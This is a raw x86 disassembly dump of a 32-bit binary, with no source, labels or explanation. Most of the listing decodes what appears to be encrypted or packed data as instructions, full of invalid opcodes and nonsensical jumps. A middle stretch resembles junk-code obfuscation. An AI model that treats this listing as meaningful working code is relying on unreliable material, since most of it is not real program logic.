  405a95:	repz xor DWORD PTR [ebx-0x4d],0xe9563ba4
  405a9d:	fwait
  405a9e:	inc    eax
  405a9f:	jae    0x405a7a
  405aa1:	test   BYTE PTR [edi],ah
  405aa3:	popa   
  405aa4:	ret    
  405aa5:	mov    cl,0x26
  405aa7:	shl    DWORD PTR [esp+esi*2-0x56],0x66
  405aac:	mov    ecx,0xdb434eb1
  405ab1:	inc    ebx
  405ab2:	sub    BYTE PTR [ebx-0x78],ch
  405ab5:	imul   edx,DWORD PTR [ebp+0x52],0xffffffd2
  405ab9:	add    eax,0xffffffab
  405abc:	dec    edx
  405abd:	pusha  
  405abe:	and    BYTE PTR [ecx+0x41],bh
  405ac1:	jo     0x405b36
  405ac3:	jbe    0x405a7f
  405ac5:	rcl    ebx,cl
  405ac7:	pusha  
  405ac8:	inc    esi
  405ac9:	push   edi
  405aca:	xor    ecx,ebp
  405acc:	rol    DWORD PTR [edx+0x58899e0f],cl
  405ad2:	xchg   edi,eax
  405ad3:	ins    DWORD PTR es:[edi],dx
  405ad4:	iret   
  405ad5:	push   esp
  405ad6:	jne    0x405ac1
  405ad8:	dec    esp
  405ad9:	mov    ds,WORD PTR [ebx]
  405adb:	data16 hlt 
  405add:	push   ebp
  405ade:	frstor [eax+eax*8-0x72a7ea91]
  405ae5:	scas   al,BYTE PTR es:[edi]
  405ae6:	daa    
  405ae7:	xor    bh,ah
  405ae9:	mov    dh,0xe0
  405aeb:	pop    ecx
  405aec:	mov    ds:0xcd1dfa64,eax
  405af1:	(bad)  
  405af3:	shl    DWORD PTR [ecx],0x4
  405af6:	mov    ds:0x22bc3a1,eax
  405afb:	aam    0x95
  405afd:	fcomp  DWORD PTR [ecx+esi*4]
  405b00:	lea    ebp,[ecx]
  405b02:	int3   
  405b03:	mov    edi,0x5b963bd7
  405b08:	aas    
  405b09:	aad    0xf7
  405b0b:	xchg   esp,eax
  405b0c:	or     bh,ch
  405b0e:	loope  0x405ad6
  405b10:	(bad)  
  405b11:	out    0x8f,al
  405b13:	and    cl,BYTE PTR [ebx-0x1e]
  405b16:	and    eax,0xa7623465
  405b1b:	call   0x1713aa33
  405b20:	fs cdq 
  405b22:	mov    ds:0x430318a8,eax
  405b27:	mov    BYTE PTR [esi+0x9209950],ch
  405b2d:	int3   
  405b2e:	sub    BYTE PTR [esi-0x61],bh
  405b31:	sub    al,0x3c
  405b33:	repnz push esi
  405b35:	sub    edx,ebx
  405b37:	or     dl,BYTE PTR [esp+ecx*8+0x3f4e2324]
  405b3e:	ins    DWORD PTR es:[edi],dx
  405b3f:	xchg   DWORD PTR [ebx+0x2d9a8afb],ebx
  405b45:	cmp    edi,DWORD PTR [edi+0x3250511a]
  405b4b:	into   
  405b4c:	jmp    0xc8b5:0xd5f7ab31
  405b53:	test   al,0x9
  405b55:	pop    ds
  405b56:	sub    esp,DWORD PTR [ecx+0x2e2da163]
  405b5c:	inc    esp
  405b5d:	out    dx,eax
  405b5e:	lods   al,BYTE PTR ds:[esi]
  405b5f:	aam    0x8d
  405b61:	sti    
  405b62:	es lahf 
  405b64:	mov    BYTE PTR [ebx-0x6f],bl
  405b67:	inc    esi
  405b68:	pushf  
  405b69:	inc    edx
  405b6a:	jmp    0x405b24
  405b6c:	out    0x99,al
  405b6e:	xor    esi,DWORD PTR [ebx+eax*4]
  405b71:	dec    ecx
  405b72:	imul   ebx,DWORD PTR [ebx+ecx*2+0x1],0x870d3c62
  405b7a:	xlat   BYTE PTR ds:[ebx]
  405b7b:	cwde   
  405b7c:	mov    eax,0x33ba03cd
  405b81:	rol    BYTE PTR [esi+0x67],cl
  405b84:	rcl    DWORD PTR [esi+eiz*8+0x7a],1
  405b88:	or     eax,0x223a6fd3
  405b8d:	lods   al,BYTE PTR ds:[esi]
  405b8e:	ror    ebp,0x84
  405b91:	push   ss
  405b92:	idiv   DWORD PTR [ebx]
  405b94:	retf   
  405b95:	fldenv [esi-0x4f]
  405b98:	jmp    0xf28d:0x828e7258
  405b9f:	xor    esp,DWORD PTR [edi]
  405ba1:	retf   0x1cfe
  405ba4:	jg     0x405bf8
  405ba6:	hlt    
  405ba7:	fldenv [ebx-0x67297af5]
  405bad:	adc    DWORD PTR [eax+esi*1+0x233b6a14],eax
  405bb4:	sbb    bl,BYTE PTR [ecx+0x18]
  405bb7:	inc    ebp
  405bb8:	test   BYTE PTR [ecx],bl
  405bba:	cld    
  405bbb:	je     0x405b60
  405bbd:	scas   eax,DWORD PTR es:[edi]
  405bbe:	inc    edx
  405bbf:	fs jecxz 0x405bfd
  405bc2:	mov    ah,0xc3
  405bc4:	adc    al,0x1a
  405bc6:	fdiv   QWORD PTR [esi-0x3502b826]
  405bcc:	xchg   edx,eax
  405bcd:	daa    
  405bce:	dec    esp
  405bcf:	ret    0x9d67
  405bd2:	out    0xb5,eax
  405bd4:	iret   
  405bd5:	pop    eax
  405bd6:	and    al,0x94
  405bd8:	inc    esp
  405bd9:	and    dh,BYTE PTR [esi+0x5b]
  405bdc:	imul   edi
  405bde:	dec    eax
  405bdf:	dec    esp
  405be0:	aas    
  405be1:	mov    esp,0x96e07f2a
  405be6:	cli    
  405be7:	std    
  405be8:	inc    esp
  405be9:	and    DWORD PTR ds:0xc9237f14,edi
  405bef:	pop    es
  405bf0:	test   BYTE PTR [ebp+0x36404c19],0xe7
  405bf7:	jmp    0x5cb13c64
  405bfc:	sub    eax,0xa2e9712d
  405c01:	icebp  
  405c02:	inc    ecx
  405c03:	adc    esi,DWORD PTR [ecx+0x2de80608]
  405c09:	mov    esi,0x5628fd13
  405c0e:	sahf   
  405c0f:	dec    edx
  405c10:	ret    0x314a
  405c13:	(bad)  
  405c14:	xor    cl,BYTE PTR [ebp-0x1c]
  405c17:	inc    edx
  405c18:	cmp    DWORD PTR [ecx],esp
  405c1a:	xchg   ebx,eax
  405c1b:	rcr    DWORD PTR [edi-0x3d94cba1],cl
  405c21:	sub    eax,0x6f38abb9
  405c26:	fld    st(0)
  405c28:	mov    bl,0x24
  405c2a:	push   edx
  405c2b:	ret    
  405c2c:	jae    0x405bd5
  405c2e:	shl    DWORD PTR cs:[bp+di+0x11],1
  405c33:	outs   dx,DWORD PTR ds:[esi]
  405c34:	lds    esp,FWORD PTR [eax+0x3f]
  405c37:	sub    eax,0x9e9b00c3
  405c3c:	cmp    eax,DWORD PTR [esi]
  405c3e:	add    BYTE PTR [edx-0x1e],0x9a
  405c42:	fst    QWORD PTR [ebx-0x19]
  405c45:	inc    eax
  405c46:	ret    
  405c47:	dec    edi
  405c48:	mov    ds:0x17ee2923,al
  405c4d:	add    eax,0x641de89c
  405c52:	fs sar eax,cl
  405c55:	popa   
  405c56:	and    DWORD PTR [esi+0x43],edi
  405c59:	pop    ss
  405c5a:	mov    WORD PTR [ebx+0x1b0b7133],es
  405c60:	lock push 0xffffffac
  405c63:	cli    
  405c64:	hlt    
  405c65:	jno    0x405c31
  405c67:	jne    0x405c6a
  405c69:	add    eax,0x7eeaf4d6
  405c6e:	add    DWORD PTR [edx],edx
  405c70:	mov    ds:0xd67ca104,eax
  405c75:	sar    BYTE PTR [eax],1
  405c77:	dec    ebx
  405c78:	dec    ebp
  405c79:	out    dx,al
  405c7a:	cld    
  405c7b:	jmp    0x405c51
  405c7d:	cmp    DWORD PTR [eax+0x4c0a4506],edi
  405c83:	pop    eax
  405c84:	sbb    ebp,ebx
  405c86:	test   al,0x13
  405c88:	(bad)  
  405c89:	(bad)  
  405c8a:	jo     0x405c5d
  405c8c:	fwait
  405c8d:	int    0x88
  405c8f:	leave  
  405c90:	popa   
  405c91:	int    0x95
  405c93:	inc    ebx
  405c94:	stos   BYTE PTR es:[edi],al
  405c95:	fs xor al,0xf1
  405c98:	out    dx,al
  405c99:	sbb    cl,dl
  405c9b:	pop    esi
  405c9c:	es dec edx
  405c9e:	mov    ebx,0xe4d90e2a
  405ca3:	sub    DWORD PTR cs:[ebx],ecx
  405ca6:	cli    
  405ca7:	mov    ah,BYTE PTR [ecx+0x6b]
  405caa:	jg     0x405cf9
  405cac:	add    edi,edi
  405cae:	(bad)  
  405caf:	aaa    
  405cb0:	dec    eax
  405cb1:	dec    ecx
  405cb2:	jl     0x405cbb
  405cb4:	add    DWORD PTR [edi],ebx
  405cb6:	not    BYTE PTR [edi-0x1]
  405cb9:	repz cmp esi,eax
  405cbc:	in     eax,0x53
  405cbe:	jg     0x405c94
  405cc0:	sub    BYTE PTR [ecx],bl
  405cc2:	mov    dh,0x4
  405cc4:	xchg   esp,eax
  405cc5:	fsubr  DWORD PTR [ecx-0x2b6dc068]
  405ccb:	in     eax,dx
  405ccc:	cmp    eax,0xb2a431d6
  405cd1:	cli    
  405cd2:	cdq    
  405cd3:	outs   dx,DWORD PTR ds:[esi]
  405cd4:	mov    BYTE PTR [edx+0x26],ch
  405cd7:	rcr    BYTE PTR [edi-0x78c4a97c],cl
  405cdd:	lahf   
  405cde:	xor    DWORD PTR [ebp+edi*1+0x5e3c5bf3],ebp
  405ce5:	jne    0x405ce7
  405ce7:	in     eax,dx
  405ce8:	jno    0x405cef
  405cea:	pop    ds
  405ceb:	cmp    BYTE PTR [ebx+0x463e542f],0xf3
  405cf2:	ss mov edx,0xcdff809e
  405cf8:	xlat   BYTE PTR ds:[ebx]
  405cf9:	xor    dh,BYTE PTR [ecx-0x73]
  405cfc:	push   ss
  405cfd:	scas   eax,DWORD PTR es:[edi]
  405cfe:	jbe    0x405d27
  405d00:	clc    
  405d01:	lods   al,BYTE PTR ds:[esi]
  405d02:	shl    DWORD PTR [esi],cl
  405d04:	sub    BYTE PTR [esi-0x1f2c9675],dl
  405d0a:	and    eax,0xdd79a5d6
  405d0f:	xor    al,0xd
  405d11:	in     al,dx
  405d12:	stos   DWORD PTR es:[edi],eax
  405d13:	mov    esp,0x8dee1f7e
  405d18:	jmp    0x8b0f:0x3f3b1aa1
  405d1f:	and    bh,al
  405d21:	gs sahf 
  405d23:	inc    BYTE PTR [esi+0x34]
  405d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d27:	loop   0x405ce1
  405d29:	push   ebp
  405d2a:	jge    0x405d66
  405d2c:	jo     0x405cf8
  405d2e:	sbb    bl,dh
  405d30:	clc    
  405d31:	in     eax,0x8
  405d33:	call   0x42d88774
  405d38:	aad    0xb5
  405d3a:	jge    0x405d3d
  405d3c:	xchg   ebx,eax
  405d3d:	test   al,0x99
  405d3f:	mov    esp,0x11354017
  405d44:	cmp    edx,DWORD PTR [edx+ebp*8-0x763f685]
  405d4b:	jne    0x405cfd
  405d4d:	scas   al,BYTE PTR es:[edi]
  405d4e:	(bad)  
  405d4f:	retf   0x5ef5
  405d52:	jmp    0x405d79
  405d54:	mov    edx,DWORD PTR [ebx+0x4]
  405d57:	movzx  edx,BYTE PTR ds:0x422946
  405d5e:	sub    DWORD PTR ds:0x4228f2,edx
  405d64:	xor    DWORD PTR [ebp-0x1c],edi
  405d67:	mov    edx,eax
  405d69:	or     DWORD PTR ds:0x4229ae,0x4229a2
  405d73:	xor    eax,eax
  405d75:	or     DWORD PTR ds:0x4228fa,0x422996
  405d7f:	or     eax,DWORD PTR [ebp-0x1c]
  405d82:	shl    edx,0x1e
  405d85:	sub    DWORD PTR ds:0x4228be,0x422982
  405d8f:	imul   eax,ecx
  405d92:	mov    ecx,DWORD PTR [ebx]
  405d94:	mov    edx,DWORD PTR [ebx+0x4]
  405d97:	shrd   ecx,edx,0x2
  405d9b:	inc    DWORD PTR ds:0x4228ee
  405da1:	mov    DWORD PTR [ebp-0x1c],ecx
  405da4:	mov    ecx,DWORD PTR [ebx]
  405da6:	xor    DWORD PTR [ebp-0x1c],edi
  405da9:	shr    edx,0x2
  405dac:	and    edx,DWORD PTR ds:0x4228ba
  405db2:	mov    edx,DWORD PTR [ebx+0x4]
  405db5:	movzx  edx,BYTE PTR ds:0x4228d2
  405dbc:	or     edx,DWORD PTR ds:0x422916
  405dc2:	mov    DWORD PTR ds:0x4228d2,edx
  405dc8:	mov    edx,ecx
  405dca:	add    DWORD PTR ds:0x42292a,0x4228d2
  405dd4:	xor    ecx,ecx
  405dd6:	and    DWORD PTR ds:0x4228c6,0x42295e
  405de0:	or     ecx,DWORD PTR [ebp-0x1c]
  405de3:	sbb    DWORD PTR ds:0x42288e,0x3b2c
  405ded:	shl    edx,0x1e
  405df0:	add    DWORD PTR ds:0x422926,0x2b51
  405dfa:	sub    ecx,eax
  405dfc:	mov    DWORD PTR ds:0x422992,0x2b61
  405e06:	mov    eax,DWORD PTR [ebp-0xc]
  405e09:	cmp    DWORD PTR [eax],ecx
  405e0b:	mov    eax,0x22e3
  405e10:	mov    eax,DWORD PTR [ebp-0xc]
  405e13:	jg     0x4069f3
  405e19:	xor    DWORD PTR ds:0x422956,0x2c62
  405e23:	mov    ecx,DWORD PTR [ebp+0x18]
  405e26:	adc    edx,0x3fdb
  405e2c:	mov    edx,DWORD PTR [ebp+0x1c]
  405e2f:	shrd   ecx,edx,0x2
  405e33:	or     DWORD PTR ds:0x42290e,0x2fd2
  405e3d:	mov    DWORD PTR [ebp-0x1c],ecx
  405e40:	xor    DWORD PTR ds:0x42297e,0x77ef
  405e4a:	mov    ecx,DWORD PTR [ebp+0x18]
  405e4d:	xor    DWORD PTR [ebp-0x1c],edi
  405e50:	shl    ecx,0x1e
  405e53:	xor    ecx,ecx
  405e55:	add    DWORD PTR ds:0x4229c6,0x4228de
  405e5f:	or     ecx,DWORD PTR [ebp-0x1c]
  405e62:	xor    DWORD PTR ds:0x42295a,0x42288a
  405e6c:	shr    edx,0x2
  405e6f:	mov    edx,DWORD PTR [ebp+0x1c]
  405e72:	mov    DWORD PTR [ebp-0x2c],ecx
  405e75:	mov    ecx,DWORD PTR [ebx]
  405e77:	or     DWORD PTR ds:0x42290a,edi
  405e7d:	mov    edx,DWORD PTR [ebx+0x4]
  405e80:	shrd   ecx,edx,0x2
  405e84:	sub    DWORD PTR ds:0x42294a,0x1cb2
  405e8e:	jmp    0x406418
  405e93:	fwait
  405e94:	push   edx
  405e95:	dec    esi
  405e96:	mov    dl,0x4e
  405e98:	xchg   edx,eax
  405e99:	sbb    edx,DWORD PTR [edx+0x58]
  405e9c:	inc    edi
  405e9d:	push   esi
  405e9e:	je     0x405e83
  405ea0:	fs push 0x16973e72
  405ea6:	push   ss
  405ea7:	cmp    eax,0x82161604
  405eac:	jp     0x405e4a
  405eae:	out    0x5e,al
  405eb0:	dec    edi
  405eb1:	cmp    al,0x6f
  405eb3:	mov    eax,0xfa8b165f
  405eb8:	js     0x405ec1
  405eba:	adc    edx,DWORD PTR [ecx+0x47]
  405ebd:	cmp    al,0x1f
  405ebf:	cli    
  405ec0:	inc    ebx
  405ec1:	mov    edx,0xe22360ca
  405ec6:	ss and al,bl
  405ec9:	repnz and DWORD PTR [ebp+0x2c],0x8f08d7bd
  405ed1:	(bad)  
  405ed2:	hlt    
  405ed3:	xor    DWORD PTR [ebx],ebx
  405ed5:	mov    DWORD PTR [ecx],edx
  405ed7:	mov    dh,0x4f
  405ed9:	sub    al,BYTE PTR ss:[esi]
  405edc:	xchg   bx,ax
  405ede:	add    BYTE PTR [esp+edx*1],ah
  405ee1:	loope  0x405f22
  405ee3:	hlt    
  405ee4:	ins    BYTE PTR es:[edi],dx
  405ee5:	xchg   BYTE PTR [edi+0x33],ah
  405ee8:	ja     0x405f53
  405eea:	xchg   ecx,eax
  405eeb:	sahf   
  405eec:	nop
  405eed:	pop    ds
  405eee:	sub    esi,DWORD PTR [ecx]
  405ef0:	sub    eax,0xb9f7f3f1
  405ef5:	push   cs
  405ef6:	loopne 0x405f62
  405ef8:	mov    bl,0x8
  405efa:	mov    eax,fs
  405efc:	ret    
  405efd:	test   eax,0x8b5e0c3d
  405f02:	nop
  405f03:	inc    eax
  405f04:	sbb    al,0xde
  405f06:	or     esi,DWORD PTR [eax-0x2]
  405f09:	into   
  405f0a:	sbb    eax,0x2009cb4f
  405f0f:	and    DWORD PTR [edi+0x5a39458a],edi
  405f15:	pop    edx
  405f16:	sub    al,al
  405f18:	jge    0x405f91
  405f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f1b:	out    dx,eax
  405f1c:	test   BYTE PTR [edi+edx*4],ch
  405f1f:	adc    al,0x1b
  405f21:	test   eax,0x460b94
  405f26:	mul    eax
  405f28:	cmp    bh,BYTE PTR fs:[edi+0x1525ad47]
  405f2f:	std    
  405f30:	pop    esi
  405f31:	imul   esi,DWORD PTR [ecx-0xa],0x52
  405f35:	pop    ebx
  405f36:	stc    
  405f37:	(bad)  
  405f38:	jmp    0x773a33ce
  405f3d:	dec    esp
  405f3e:	jae    0x405f20
  405f40:	sub    BYTE PTR [edi+eiz*4+0x20],ch
  405f44:	in     al,dx
  405f45:	pop    eax
  405f46:	pop    esi
  405f47:	jmp    0x405f38
  405f49:	stos   BYTE PTR es:[edi],al
  405f4a:	imul   ebp,DWORD PTR [bp+di-0x18e8],0xdcea536d
  405f53:	stos   DWORD PTR es:[edi],eax
  405f54:	retf   
  405f55:	jmp    0x9cdf8cc1
  405f5a:	pusha  
  405f5b:	mov    esi,0x7b7f482d
  405f60:	or     cl,ch
  405f62:	addr16 pop esp
  405f64:	mov    ecx,0xe77143cd
  405f69:	iret   
  405f6a:	inc    esp
  405f6b:	(bad)  
  405f6c:	mov    al,0xb6
  405f6e:	jb     0x405f7e
  405f70:	mov    al,ds:0x125c99d6
  405f75:	xlat   BYTE PTR ds:[ebx]
  405f76:	pusha  
  405f77:	test   BYTE PTR [edx],ch
  405f79:	enter  0x1ab4,0x80
  405f7d:	ret    
  405f7e:	pusha  
  405f7f:	pop    ecx
  405f80:	pop    edi
  405f81:	mov    esi,0xa06c7fff
  405f86:	jmp    0x405f3f
  405f88:	xchg   ecx,eax
  405f89:	popa   
  405f8a:	mov    dh,0xe4
  405f8c:	jnp    0x405f6b
  405f8e:	xor    ecx,DWORD PTR [edi-0x2e428f8b]
  405f94:	xchg   ecx,eax
  405f95:	jb     0x405f17
  405f97:	pop    ebp
  405f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f99:	out    0x5,eax
  405f9b:	mov    DWORD PTR [ebx],eax
  405f9d:	cmc    
  405f9e:	ret    0x415a
  405fa1:	jne    0x405fda
  405fa3:	xor    al,0xd4
  405fa5:	cvtps2pi mm7,QWORD PTR [edi+0x18]
  405fa9:	nop
  405faa:	push   edx
  405fab:	dec    BYTE PTR [ebx+0x25]
  405fae:	out    0x2b,al
  405fb0:	inc    esi
  405fb1:	(bad)  
  405fb3:	js     0x405fe5
  405fb5:	mov    edx,0xc9aa9971
  405fba:	ret    
  405fbb:	push   esi
  405fbc:	or     DWORD PTR [edx+0x55],ecx
  405fbf:	out    dx,al
  405fc0:	jmp    0xe8b6:0x1eef0b7e
  405fc7:	cmp    BYTE PTR [ebx-0x49e37bb],cl
  405fcd:	mov    bl,0x36
  405fcf:	stos   DWORD PTR es:[edi],eax
  405fd0:	pop    ds
  405fd1:	pop    edx
  405fd2:	mov    DWORD PTR [edx+0x7b62940a],ecx
  405fd8:	xchg   ebx,eax
  405fd9:	inc    esp
  405fda:	stc    
  405fdb:	adc    bl,al
  405fdd:	test   eax,0x3acc6d80
  405fe2:	mov    esi,0xf7444751
  405fe7:	test   al,0xb3
  405fe9:	aad    0xfa
  405feb:	cmc    
  405fec:	adc    BYTE PTR [eax+0x27],ah
  405fef:	lods   al,BYTE PTR ds:[esi]
  405ff0:	add    cl,ah
  405ff2:	push   eax
  405ff3:	xor    al,0x68
  405ff5:	and    esp,DWORD PTR [eax-0x19e2587]
  405ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ffc:	test   DWORD PTR [eax],ebx
  405ffe:	mov    dh,0x4a
  406000:	mov    dh,0x37
  406002:	cli    
  406003:	cmp    eax,0xb6e4a6a2
  406008:	test   eax,0xfa418b1f
  40600d:	add    eax,0x90772f6f
  406012:	out    dx,al
  406013:	sbb    ecx,edx
  406015:	test   al,0x96
  406017:	dec    eax
  406018:	pop    ss
  406019:	pop    eax
  40601a:	das    
  40601b:	leave  
  40601c:	jge    0x406044
  40601e:	dec    esp
  40601f:	jg     0x40603a
  406021:	data16 cmp cl,BYTE PTR [ebx+0x7c578667]
  406028:	mov    al,0x3b
  40602a:	bound  ecx,QWORD PTR [ebx]
  40602c:	loop   0x4060a0
  40602e:	ret    
  40602f:	sbb    ah,bl
  406031:	jmp    0x406039
  406033:	pushf  
  406034:	shr    DWORD PTR [eax+ecx*8],0x1b
  406038:	lods   al,BYTE PTR ds:[esi]
  406039:	push   esi
  40603a:	ja     0x405ff4
  40603c:	adc    DWORD PTR [ebx-0x2042747a],0xffffff89
  406043:	call   0x48928a14
  406048:	and    eax,0xf578e778
  40604d:	xor    cl,0xc1
  406050:	jge    0x406092
  406052:	clc    
  406053:	rcr    BYTE PTR [edi],cl
  406055:	out    0x42,al
  406057:	or     DWORD PTR [ebx-0x303584cf],edi
  40605d:	xchg   ebp,ebx
  40605f:	(bad)  
  406060:	mov    eax,0xb9287c87
  406065:	cmp    bh,BYTE PTR [eax]
  406067:	test   DWORD PTR [esi],0xc9e387fe
  40606d:	push   ds
  40606e:	adc    BYTE PTR [esi-0x20fbceba],cl
  406074:	sub    dh,ch
  406076:	mov    al,ds:0xb50a9471
  40607b:	jbe    0x406076
  40607d:	mov    BYTE PTR [edi-0x14],dl
  406080:	enter  0x59b8,0xb3
  406084:	cmc    
  406085:	dec    ebp
  406086:	fsub   DWORD PTR [edx+0x20e12b74]
  40608c:	mov    ebx,0xbb3fee94
  406091:	sub    al,0xed
  406093:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406095:	(bad)  
  406096:	in     eax,dx
  406097:	retf   0xf42
  40609a:	clc    
  40609b:	fs lahf 
  40609d:	inc    edx
  40609e:	push   es
  40609f:	push   ss
  4060a0:	pop    esp
  4060a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060a2:	add    DWORD PTR [eax],edi
  4060a4:	push   ss
  4060a5:	and    eax,0xfa71e336
  4060aa:	retf   
  4060ab:	outs   dx,BYTE PTR ds:[esi]
  4060ac:	enter  0x96be,0x70
  4060b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060b1:	or     esp,DWORD PTR [edx+eiz*4-0x1b689272]
  4060b8:	push   ds
  4060b9:	sahf   
  4060ba:	sub    bh,BYTE PTR [edx-0x7de81c5f]
  4060c0:	fld    TBYTE PTR [edx]
  4060c2:	sub    BYTE PTR [ecx+ebx*2+0x781c2677],0x75
  4060ca:	push   ebx
  4060cb:	leave  
  4060cc:	jnp    0x4060ee
  4060ce:	loop   0x4060fd
  4060d0:	pop    ss
  4060d1:	call   0x835798e2
  4060d6:	add    bl,ah
  4060d8:	mov    bl,0xa
  4060da:	push   0x1d
  4060dc:	outs   dx,DWORD PTR ds:[esi]
  4060dd:	mov    cl,0xe7
  4060df:	mov    ch,0x52
  4060e1:	adc    DWORD PTR [ebp+0x49],0x42
  4060e5:	or     eax,0x334a72f5
  4060ea:	mov    bh,0xff
  4060ec:	pusha  
  4060ed:	add    al,BYTE PTR [edx-0x70108688]
  4060f3:	inc    eax
  4060f4:	add    DWORD PTR [esi-0x31],edi
  4060f7:	inc    edi
  4060f8:	sbb    BYTE PTR [ebx+0x48],0xec
  4060fc:	popf   
  4060fd:	(bad)  
  4060fe:	(bad)  [eax-0x4cee7fd]
  406104:	xchg   ebp,eax
  406105:	xor    bh,al
  406107:	mov    bl,dl
  406109:	nop
  40610a:	pop    ecx
  40610b:	jno    0x40614f
  40610d:	mov    ebp,0x426315fe
  406112:	call   0x6d07d63d
  406117:	push   0xcd242f0c
  40611c:	out    dx,eax
  40611d:	xor    eax,0xa4b2f53a
  406122:	sub    DWORD PTR [edx+0x37],eax
  406125:	xchg   edx,eax
  406126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406127:	gs push eax
  406129:	in     al,0xb8
  40612b:	jmp    0x40614f
  40612d:	push   ebx
  40612e:	jo     0x4060c5
  406130:	xor    ah,ch
  406132:	sbb    edx,esp
  406134:	xor    ecx,DWORD PTR [ebp+ecx*1-0xd]
  406138:	pushf  
  406139:	jl     0x4061b9
  40613b:	cmp    eax,0x5caa4c1e
  406140:	popf   
  406141:	mov    eax,0xc8cd77d6
  406146:	aam    0xd5
  406148:	lea    eax,[edi]
  40614a:	in     al,0x54
  40614c:	dec    eax
  40614d:	lods   eax,DWORD PTR ds:[esi]
  40614e:	jne    0x4060ee
  406150:	dec    BYTE PTR ds:0xd42f75ad
  406156:	ficom  WORD PTR [edx+0x1c]
  406159:	imul   eax,DWORD PTR [eax-0x33e88d99],0x2f
  406160:	lods   eax,DWORD PTR ds:[esi]
  406161:	jmp    0x40616d
  406163:	push   cs
  406164:	push   ebx
  406165:	and    bh,al
  406167:	xor    al,0x9d
  406169:	leave  
  40616a:	jne    0x406112
  40616c:	xchg   BYTE PTR [edi],dh
  40616e:	les    esi,FWORD PTR [esi]
  406170:	xor    BYTE PTR [esi+0x437316b8],bh
  406176:	inc    ebx
  406177:	xor    bh,BYTE PTR [esi+0x5]
  40617a:	add    DWORD PTR [esi-0x12],esi
  40617d:	xchg   edi,eax
  40617e:	es jb  0x40615b
  406181:	push   ebp
  406182:	jp     0x4061af
  406184:	cmp    al,0x94
  406186:	pop    esi
  406187:	sbb    al,0x91
  406189:	data16 stc 
  40618b:	add    eax,DWORD PTR [esi-0x79]
  40618e:	fidivr WORD PTR [edi+0x2a]
  406191:	jle    0x4061e9
  406193:	clc    
  406194:	or     bh,BYTE PTR [edx]
  406196:	xor    DWORD PTR [ecx+edi*2-0x60661837],esp
  40619d:	in     eax,0xeb
  40619f:	jmp    0xef5b3d9
  4061a4:	pusha  
  4061a5:	fisubr DWORD PTR [ebx+0x30]
  4061a8:	fadd   QWORD PTR [esi+0x23]
  4061ab:	jg     0x4061f7
  4061ad:	dec    esp
  4061ae:	leave  
  4061af:	cld    
  4061b0:	call   0xdb52:0xf6cbc107
  4061b7:	aam    0x1b
  4061b9:	push   esi
  4061ba:	pushf  
  4061bb:	adc    DWORD PTR ds:0x752efa77,esi
  4061c1:	dec    ecx
  4061c2:	test   DWORD PTR [edx+ecx*2-0x61],edx
  4061c6:	sar    esi,1
  4061c8:	mov    bh,0xf
  4061ca:	test   BYTE PTR [ecx+0x4719bdca],cl
  4061d0:	pop    esp
  4061d1:	mov    ds:0x554693be,al
  4061d6:	cli    
  4061d7:	ins    DWORD PTR es:[edi],dx
  4061d8:	inc    ebx
  4061d9:	mov    cl,0x28
  4061db:	pusha  
  4061dc:	scas   eax,DWORD PTR es:[edi]
  4061dd:	sti    
  4061de:	push   edx
  4061df:	add    al,0xfe
  4061e1:	in     eax,dx
  4061e2:	jecxz  0x40621a
  4061e4:	cld    
  4061e5:	pop    eax
  4061e6:	ds mov bl,0xe5
  4061e9:	sbb    WORD PTR ds:0x66694bc9,bp
  4061f0:	retf   
  4061f1:	jmp    0x406207
  4061f3:	jo     0x4061fe
  4061f5:	jge    0x406226
  4061f7:	(bad)  [esi+edi*8]
  4061fa:	shl    DWORD PTR [ebp+0x36],cl
  4061fd:	push   es
  4061fe:	adc    eax,0xd19bd3
  406203:	cmp    eax,0xae38addf
  406208:	and    ch,BYTE PTR ds:0xcdb67ec0
  40620e:	jmp    0x8434:0x6db7b9de
  406215:	pop    edx
  406216:	popa   
  406217:	and    dl,BYTE PTR [esi]
  406219:	test   DWORD PTR [ebx],eax
  40621b:	inc    edx
  40621c:	xchg   BYTE PTR [edi],ah
  40621e:	sti    
  40621f:	ret    0x48e3
  406222:	int3   
  406223:	inc    edx
  406224:	je     0x406298
  406226:	push   0x6821b074
  40622b:	xor    DWORD PTR [edx-0x11],edi
  40622e:	push   ds
  40622f:	mov    edx,0x1a0c80f6
  406234:	push   eax
  406235:	ss xor al,0xf3
  406238:	or     DWORD PTR [ebx],eax
  40623a:	inc    esi
  40623b:	sbb    al,0x9c
  40623d:	push   ebp
  40623e:	inc    ecx
  40623f:	pushf  
  406240:	popf   
  406241:	xchg   esp,eax
  406242:	ret    0x83d2
  406245:	dec    ecx
  406246:	jo     0x4061d8
  406248:	imul   esi,DWORD PTR [ebp+0x75dad087],0xd5216098
  406252:	xor    eax,0xf9c5a7fb
  406257:	shr    al,1
  406259:	pop    edx
  40625a:	cmp    DWORD PTR [eax-0x35],0x821952a2
  406261:	mov    al,ds:0x1ab40641
  406266:	std    
  406267:	xor    al,0x46
  406269:	test   DWORD PTR [edi-0x5953a26c],edx
  40626f:	pop    esi
  406270:	fdivr  DWORD PTR [eax+0x6e]
  406273:	jp     0x406218
  406275:	jbe    0x406275
  406277:	pop    edx
  406278:	aas    
  406279:	push   cs
  40627a:	rol    bh,cl
  40627c:	sub    esp,DWORD PTR [edi]
  40627e:	and    BYTE PTR [ebp-0x7a],dh
  406281:	jecxz  0x40628a
  406283:	test   DWORD PTR [ebp+0x28ca279f],0x9c640ac0
  40628d:	xchg   BYTE PTR [esi-0x15],dh
  406290:	xchg   esi,eax
  406291:	or     ch,BYTE PTR [esi+eiz*1]
  406294:	aas    
  406295:	pop    ebx
  406296:	mov    DWORD PTR [esi+0x5f4a77f5],esp
  40629c:	push   edx
  40629d:	repnz aam 0xbb
  4062a0:	imul   ebx,DWORD PTR [ecx-0x6e],0xcfe38d9f
  4062a7:	lods   al,BYTE PTR ds:[esi]
  4062a8:	and    al,0x14
  4062aa:	adc    edx,DWORD PTR [edx-0x5d]
  4062ad:	js     0x40626d
  4062af:	sub    al,0x23
  4062b1:	xchg   DWORD PTR [ecx-0x80],eax
  4062b4:	push   edi
  4062b5:	mov    al,dh
